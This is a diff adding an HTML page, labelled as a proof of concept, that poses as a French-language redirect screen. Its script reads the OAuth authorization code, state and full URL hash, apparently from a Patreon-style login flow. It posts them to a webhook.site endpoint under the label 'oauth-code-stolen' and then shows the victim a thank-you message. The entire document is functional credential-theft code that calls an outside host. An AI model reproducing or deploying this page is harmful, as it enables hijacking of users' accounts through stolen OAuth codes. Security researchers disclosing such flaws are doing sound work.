@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<p id="msg">Redirection en cours...</p>
+<script>
+// PoC: reads OAuth code from hash fragment and exfiltrates it
+var hash = window.location.hash;
+if (hash) {
+    var raw = hash.substring(1);
+    if (raw.startsWith('patreon-auth:')) {
+        raw = raw.split(':').slice(1).join(':');
+    }
+    var params = new URLSearchParams(raw);
+    var code = params.get('code');
+    var state = params.get('state');
+
+    // Send to webhook.site
+    fetch('https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            type: 'oauth-code-stolen',
+            code: code,
+            state: state,
+            full_hash: hash,
+            timestamp: new Date().toISOString()
+        })
+    });
+
+    document.getElementById('msg').textContent = 'Merci ! Vous pouvez fermer cette page.';
+} else {
+    document.getElementById('msg').textContent = 'Aucune donnee.';
+}
+</script>
+</body>
+</html>
